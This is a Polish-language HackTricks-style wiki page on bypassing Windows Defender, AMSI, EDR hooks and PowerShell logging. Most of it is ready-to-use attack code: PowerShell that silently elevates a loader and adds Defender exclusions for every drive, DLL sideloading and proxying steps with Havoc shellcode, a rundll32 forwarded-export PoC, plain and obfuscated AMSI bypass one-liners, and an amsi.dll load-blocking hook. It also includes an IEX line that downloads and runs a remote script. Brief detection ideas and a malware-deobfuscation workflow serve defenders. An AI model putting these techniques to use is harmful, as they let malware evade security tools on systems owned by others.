# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ta strona została napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Zatrzymanie Defendera

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania działania Windows Defender, podszywając się pod inny AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Przynęta UAC w stylu instalatora przed manipulacją Defenderem

Publiczne loadery podszywające się pod game cheats często są dystrybuowane jako niepodpisane instalatory Node.js/Nexe, które najpierw **żądają od użytkownika podwyższenia uprawnień** i dopiero potem neutralizują Defendera. Przepływ jest prosty:

1. Sprawdź kontekst administracyjny za pomocą `net session`. Polecenie zakończy się sukcesem tylko wtedy, gdy wywołujący posiada prawa administratora, więc błąd wskazuje, że loader działa jako użytkownik standardowy.
2. Natychmiast ponownie uruchamia się z użyciem parametru `RunAs`, aby wywołać oczekiwany monit zgody UAC, zachowując oryginalną linię poleceń.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Ofiary już wierzą, że instalują „cracked” oprogramowanie, więc monit jest zwykle akceptowany, dając malware uprawnienia potrzebne do zmiany polityki Defendera.

### Ogólne wykluczenia `MpPreference` dla każdej litery dysku

Po uzyskaniu uprawnień, GachiLoader-style chains maksymalizują luki w wykrywaniu Defendera zamiast całkowicie wyłączać usługę. Loader najpierw zabija GUI watchdog (`taskkill /F /IM SecHealthUI.exe`), a następnie wprowadza **bardzo szerokie wykluczenia**, dzięki czemu każdy profil użytkownika, katalog systemowy i dysk wymienny stają się niepodlegające skanowaniu:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Kluczowe obserwacje:

- Pętla przegląda każdy zamontowany system plików (D:\, E:\, USB sticks, etc.) więc **wszystkie przyszłe payloady upuszczone gdziekolwiek na dysku są ignorowane**.
- Wykluczenie rozszerzenia `.sys` jest perspektywiczne — atakujący rezerwują sobie opcję załadowania niepodpisanych sterowników później bez ponownego ingerowania w Defender.
- Wszystkie zmiany trafiają pod `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, co pozwala późniejszym etapom potwierdzić, że wykluczenia utrzymują się lub je rozszerzyć bez ponownego wywoływania UAC.

Ponieważ żadna usługa Defendera nie jest zatrzymywana, naiwny check stanu wciąż raportuje „antywirus aktywny”, nawet jeśli inspekcja w czasie rzeczywistym nigdy nie dotyka tych ścieżek.

## **Metodologia omijania AV**

Obecnie AV stosują różne metody oceny złośliwości pliku: detekcję statyczną, analizę dynamiczną, a w przypadku bardziej zaawansowanych EDR — analizę behawioralną.

### **Detekcja statyczna**

Detekcja statyczna polega na wykrywaniu znanych złośliwych ciągów znaków lub tablic bajtów w binarium lub skrypcie, a także na ekstrakcji informacji z samego pliku (np. opis pliku, nazwa firmy, podpisy cyfrowe, ikona, suma kontrolna itp.). Oznacza to, że używanie znanych publicznych narzędzi może łatwiej doprowadzić do wykrycia, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Jest kilka sposobów obejścia tego rodzaju detekcji:

- **Szyfrowanie**

Jeśli zaszyfrujesz plik binarny, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebował loadera, żeby odszyfrować i uruchomić program w pamięci.

- **Obfuskacja**

Czasami wystarczy zmienić kilka stringów w binarnym pliku lub skrypcie, żeby ominąć AV, ale w zależności od tego, co próbujesz obfuskować, może to być czasochłonne.

- **Własne narzędzia**

Jeśli rozwiniesz własne narzędzia, nie będzie znanych złych sygnatur, ale to zabiera dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem sprawdzenia detekcji statycznej przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dzieli on plik na wiele segmentów i zleca Defenderowi skanowanie każdego z nich osobno, dzięki czemu potrafi wskazać dokładnie, które ciągi lub bajty w twoim binarium zostały oznaczone.

Gorąco polecam zapoznać się z tą [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym AV Evasion.

### **Analiza dynamiczna**

Analiza dynamiczna polega na uruchomieniu twojego binarium przez AV w sandboxie i obserwowaniu złośliwej aktywności (np. próby odszyfrowania i odczytania haseł z przeglądarki, wykonania minidump na LSASS itp.). Ta część może być trudniejsza, ale oto kilka rzeczy, które możesz zrobić, aby ominąć sandboxy.

- **Wstrzymaj wykonanie (sleep before execution)** W zależności od implementacji może to być dobry sposób na obejście dynamicznej analizy AV. AV mają bardzo mało czasu na skanowanie plików, by nie przerywać pracy użytkownika, więc użycie długich sleepów może zaburzyć analizę binariów. Problem w tym, że wiele sandboxów AV może po prostu pominąć sleep w zależności od implementacji.
- **Sprawdzanie zasobów maszyny** Zwykle sandboxy mają bardzo mało zasobów do dyspozycji (np. < 2GB RAM), w przeciwnym razie mogłyby spowolnić maszynę użytkownika. Możesz też być kreatywny — na przykład sprawdzając temperaturę CPU lub prędkość wentylatorów; nie wszystko będzie zaimplementowane w sandboxie.
- **Sprawdzenia specyficzne dla maszyny** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera, czy pasuje do tej, którą określiłeś; jeśli nie, program może zakończyć działanie.

Okazuje się, że nazwa komputera w sandboxie Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli nazwa to HAL9TH, oznacza to, że jesteś w sandboxie Defendera i możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych bardzo dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących obchodzenia sandboxów

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak już wspomnieliśmy wcześniej, **publiczne narzędzia** w końcu **zostaną wykryte**, więc powinieneś sobie zadać pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz używać mimikatz**? A może możesz użyć innego, mniej znanego projektu, który też zrzuca LSASS.

Prawidłowa odpowiedź to prawdopodobnie to drugie. Biorąc mimikatz jako przykład, to prawdopodobnie jeden z — jeśli nie najbardziej — wykrywanych przez AV i EDR projektów; choć sam projekt jest świetny, jest koszmarem przy próbach obejścia AV, więc po prostu szukaj alternatyw do osiągnięcia tego, co chcesz.

> [!TIP]
> Modyfikując swoje payloady pod kątem unikania wykrycia, upewnij się, że wyłączyłeś automatyczne przesyłanie próbek w Defender, i proszę, na serio, **NIE WYSYŁAJ NA VIRUSTOTAL**, jeśli twoim celem jest długoterminowe unikanie wykrycia. Jeśli chcesz sprawdzić, czy twój payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne przesyłanie próbek i testuj tam, aż będziesz zadowolony z wyniku.

## EXE kontra DLL

Kiedy tylko to możliwe, zawsze **priorytetowo używaj DLLów do omijania wykrycia** — moim zdaniem pliki DLL są zwykle **znacznie rzadziej wykrywane** i analizowane, więc to prosty trik, żeby w niektórych przypadkach uniknąć detekcji (oczywiście jeśli twój payload może uruchomić się jako DLL).

Jak widać na tym obrazie, DLL payload z Havoc ma wykrywalność 4/26 na antiscan.me, podczas gdy EXE payload ma wykrywalność 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Poniżej pokażemy triki, których możesz użyć z plikami DLL, aby być znacznie bardziej ukrytym.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL używaną przez loader, umieszczając aplikację ofiary i złośliwe payload(y) obok siebie.

Możesz sprawdzić programy podatne na DLL Sideloading używając [Siofra](https://github.com/Cybereason/siofra) i poniższego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
To polecenie wyświetli listę programów podatnych na DLL hijacking w "C:\Program Files\\" oraz pliki DLL, które próbują załadować.

Zdecydowanie polecam, abyś **zbadał samodzielnie DLL Hijackable/Sideloadable programs** — ta technika jest dość stealthy, jeśli zostanie wykonana poprawnie; jednak jeśli użyjesz publicznie znanych DLL Sideloadable programs, możesz łatwo zostać złapany.

Samo umieszczenie złośliwego DLL o nazwie, którą program oczekuje załadować, nie spowoduje uruchomienia twojego payloadu, ponieważ program oczekuje konkretnych funkcji wewnątrz tego DLL. Aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekazuje wywołania, które program wykonuje, z proxy (i złośliwego) DLL do oryginalnego DLL, dzięki czemu zachowana jest funkcjonalność programu i możliwe jest obsłużenie uruchomienia twojego payloadu.

Będę używać projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalny przemianowany DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) jak i proxy DLL mają wskaźnik wykrywalności 0/26 na [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **highly recommend** you watch [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) about DLL Sideloading and also [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) to learn more about what we've discussed more in-depth.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules mogą eksportować funkcje, które są w rzeczywistości "forwarders": zamiast wskazywać na kod, wpis eksportu zawiera ciąg ASCII w postaci `TargetDll.TargetFunc`. Gdy wywołujący rozwiązuje eksport, loader Windows wykona:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Kluczowe zachowania do zrozumienia:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

To umożliwia pośrednią prymitywę sideloading: znajdź podpisany DLL, który eksportuje funkcję forwardowaną do nazwy modułu niebędącej KnownDLL, następnie umieść ten podpisany DLL w tym samym katalogu co DLL kontrolowany przez atakującego, nazwany dokładnie tak, jak docelowy, forwardowany moduł. Gdy forwardowany eksport zostanie wywołany, loader rozwiąże forward i załaduje Twój DLL z tego samego katalogu, wykonując Twoje DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc zostaje rozwiązywana zgodnie z normalną kolejnością wyszukiwania.

PoC (copy-paste):
1) Skopiuj podpisany systemowy DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Upuść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Minimalny DllMain wystarczy, by uzyskać wykonanie kodu; nie musisz implementować przekierowanej funkcji, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wywołaj przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- While resolving `KeyIsoSetAuditingInterface`, the loader follows the forward to `NCRYPTPROV.SetAuditingInterface`
- The loader then loads `NCRYPTPROV.dll` from `C:\test` and executes its `DllMain`
- If `SetAuditingInterface` is not implemented, you'll get a "missing API" error only after `DllMain` has already run

Hunting tips:
- Skup się na przekierowywanych eksportach (forwarded exports), gdzie moduł docelowy nie jest KnownDLL. KnownDLLs są wymienione pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz wyenumerować przekierowywane eksporty za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz inwentarz forwarderów Windows 11, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL z katalogów innych niż systemowe, a następnie ładujące non-KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Wysyłaj alerty dla łańcuchów procesów/modułów takich jak: `rundll32.exe` → nie-systemowy `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuś polityki integralności kodu (WDAC/AppLocker) i zabroń write+execute w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i wykonać swój shellcode w sposób ukryty.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Unikanie wykrywania to gra w kotka i myszkę — to, co działa dziś, może zostać wykryte jutro, więc nigdy nie polegaj wyłącznie na jednym narzędziu; jeśli to możliwe, łącz kilka technik unikania wykrycia.

## Bezpośrednie/pośrednie Syscalls i rozwiązywanie SSN (SysWhispers4)

EDRs często umieszczają **user-mode inline hooks** na stubach `ntdll.dll` syscall. Aby obejść te hooks, możesz wygenerować **direct** lub **indirect** syscall stuby, które ładują poprawny **SSN** (System Service Number) i przechodzą do trybu jądra bez wykonywania zahakowanego punktu wejścia eksportu.

**Opcje wywołania:**
- **Direct (embedded)**: emituj instrukcję `syscall`/`sysenter`/`SVC #0` w wygenerowanym stubie (brak trafienia eksportu `ntdll`).
- **Indirect**: skocz do istniejącego gadgetu `syscall` w `ntdll`, tak aby przejście do jądra wyglądało jak pochodzące z `ntdll` (przydatne do omijania heurystyk); **randomized indirect** wybiera gadget z puli dla każdego wywołania.
- **Egg-hunt**: unikaj osadzania statycznej sekwencji opcode `0F 05` na dysku; rozwiązuj sekwencję syscall w czasie wykonania.

**Strategie rozwiązywania SSN odporne na hooki:**
- **FreshyCalls (VA sort)**: wywnioskowanie SSN poprzez sortowanie stubów syscall według adresu wirtualnego zamiast czytania bajtów stubu.
- **SyscallsFromDisk**: zmapuj czysty `\KnownDlls\ntdll.dll`, odczytaj SSN z jego `.text`, następnie odmapuj (omija wszystkie hooki w pamięci).
- **RecycledGate**: połącz inferencję SSN opartą na sortowaniu według VA z walidacją opcode, gdy stub jest czysty; w razie hooka wróć do inferencji na podstawie VA.
- **HW Breakpoint**: ustaw DR0 na instrukcji `syscall` i użyj VEH, aby przechwycić SSN z rejestru `EAX` w czasie wykonania, bez parsowania zahakowanych bajtów.

Przykład użycia SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI został stworzony, aby zapobiegać "fileless malware". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Pozwala to rozwiązaniom antywirusowym na analizę zachowania skryptów poprzez ujawnienie ich zawartości w formie nieszyfrowanej i niezamaskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujące ostrzeżenie w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zauważ, że poprzedza to `amsi:` a następnie ścieżkę do pliku wykonywalnego, z którego uruchomiono skrypt, w tym przypadku, powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy wykryci w pamięci z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# jest również uruchamiany przez AMSI. Dotyczy to nawet `Assembly.Load(byte[])` używanego do in-memory execution. Dlatego zaleca się używanie starszych wersji .NET (np. 4.7.2 lub niższych) dla in-memory execution, jeśli chcesz ominąć AMSI.

Jest kilka sposobów na obejście AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie na wykryciach statycznych, modyfikacja skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

Jednak AMSI ma zdolność deobfuskowania skryptów nawet gdy są wielowarstwowo obfuskowane, więc obfuskacja może się okazać złym wyborem w zależności od sposobu jej wykonania. To sprawia, że ominięcie nie jest proste. Czasami jednak wystarczy zmienić kilka nazw zmiennych i wszystko będzie OK — zależy to od tego, jak bardzo coś zostało oznaczone.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane poprzez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe itp.), możliwe jest łatwe manipulowanie nim nawet przy uruchomieniu jako nieuprzywilejowany użytkownik. Z powodu tej wady implementacyjnej badacze znaleźli wiele sposobów na ominięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (amsiInitFailed) spowoduje, że dla bieżącego procesu nie zostanie uruchomione żadne skanowanie. Początkowo zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation), a Microsoft opracował sygnaturę, by zapobiec szerokiemu wykorzystaniu.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI bezużytecznym dla bieżącego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, więc konieczna jest pewna modyfikacja, aby użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że to prawdopodobnie zostanie wykryte po opublikowaniu tego wpisu, więc jeśli chcesz pozostać niezauważony, nie publikuj żadnego kodu.

**Memory Patching**

Ta technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie danych dostarczonych przez użytkownika) i nadpisaniu jej instrukcjami powodującymi zwrócenie kodu E_INVALIDARG — w ten sposób wynik rzeczywistego skanu będzie 0, co interpretuje się jako wynik czysty.

> [!TIP]
> Przeczytaj [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) aby uzyskać bardziej szczegółowe wyjaśnienie.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blokowanie AMSI przez zapobieganie załadowaniu amsi.dll (LdrLoadDll hook)

AMSI jest inicjalizowany dopiero po załadowaniu `amsi.dll` do bieżącego procesu. Solidnym, niezależnym od języka obejściem jest umieszczenie hooka w trybie użytkownika na `ntdll!LdrLoadDll`, który zwraca błąd, gdy żądanym modułem jest `amsi.dll`. W rezultacie AMSI nigdy się nie ładuje i w tym procesie nie odbywają się żadne skany.

Zarys implementacji (x64 C/C++ pseudokod):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Uwagi
- Działa zarówno w PowerShell, WScript/CScript, jak i w niestandardowych loaderach (wszystko, co w przeciwnym razie załadowałoby AMSI).
- Łączyć z podawaniem skryptów przez stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), aby uniknąć długich artefaktów w linii poleceń.
- Widziano użycie przez loadery uruchamiane przez LOLBins (np. `regsvr32` wywołujące `DllRegisterServer`).

Narzędzie **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generuje także skrypt do obejścia AMSI.
Narzędzie **[https://amsibypass.com/](https://amsibypass.com/)** również generuje skrypt do obejścia AMSI, który unika wykrycia poprzez losowanie nazw funkcji i zmiennych zdefiniowanych przez użytkownika, losowe wyrażenia znaków oraz zastosowanie losowej wielkości liter w słowach kluczowych PowerShell, aby uniknąć wykrycia sygnatury.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie działa przez skanowanie pamięci bieżącego procesu w poszukiwaniu sygnatury AMSI i nadpisanie jej instrukcjami NOP, skutecznie usuwając ją z pamięci.

**Produkty AV/EDR korzystające z AMSI**

Listę produktów AV/EDR korzystających z AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj PowerShell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging to funkcja, która pozwala rejestrować wszystkie polecenia PowerShell wykonywane na systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też stanowić problem dla atakujących, którzy chcą unikać wykrycia.

Aby obejść PowerShell logging, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: jeśli użyjesz PowerShell version 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Zrób to: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby uruchomić powershell bez zabezpieczeń (to właśnie używa `powerpick` z Cobal Strike).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

When analysing malware that uses ConfuserEx 2 (or commercial forks) it is common to face several layers of protection that will block decompilers and sandboxes. The workflow below reliably **restores a near–original IL** that can afterwards be decompiled to C# in tools such as dnSpy or ILSpy.

1.  Anti-tampering removal – ConfuserEx encrypts every *method body* and decrypts it inside the *module* static constructor (`<Module>.cctor`). This also patches the PE checksum so any modification will crash the binary. Use **AntiTamperKiller** to locate the encrypted metadata tables, recover the XOR keys and rewrite a clean assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output contains the 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) that can be useful when building your own unpacker.

2.  Symbol / control-flow recovery – feed the *clean* file to **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – select the ConfuserEx 2 profile
• de4dot will undo control-flow flattening, restore original namespaces, classes and variable names and decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx replaces direct method calls with lightweight wrappers (a.k.a *proxy calls*) to further break decompilation. Remove them with **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
After this step you should observe normal .NET API such as `Convert.FromBase64String` or `AES.Create()` instead of opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – run the resulting binary under dnSpy, search for large Base64 blobs or `RijndaelManaged`/`TripleDESCryptoServiceProvider` use to locate the *real* payload. Often the malware stores it as a TLV-encoded byte array initialised inside `<Module>.byte_0`.

The above chain restores execution flow **without** needing to run the malicious sample – useful when working on an offline workstation.

> 🛈  ConfuserEx produces a custom attribute named `ConfusedByAttribute` that can be used as an IOC to automatically triage samples.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuskator C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest udostępnienie otwartoźródłowego forka zestawu kompilacyjnego [LLVM](http://www.llvm.org/) zdolnego zwiększyć bezpieczeństwo oprogramowania poprzez code obfuscation i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator pokazuje, jak użyć języka `C++11/14` do generowania, w czasie kompilacji, obfuscated code bez użycia zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez C++ template metaprogramming framework, co utrudni życie osobie próbującej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator, który potrafi obfuskować różne pliki pe, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to szczegółowy code obfuscation framework dla języków wspieranych przez LLVM wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskatuje program na poziomie assembly code, przekształcając zwykłe instrukcje w ROP chains, co zaburza naszą naturalną percepcję normalnego przepływu sterowania.
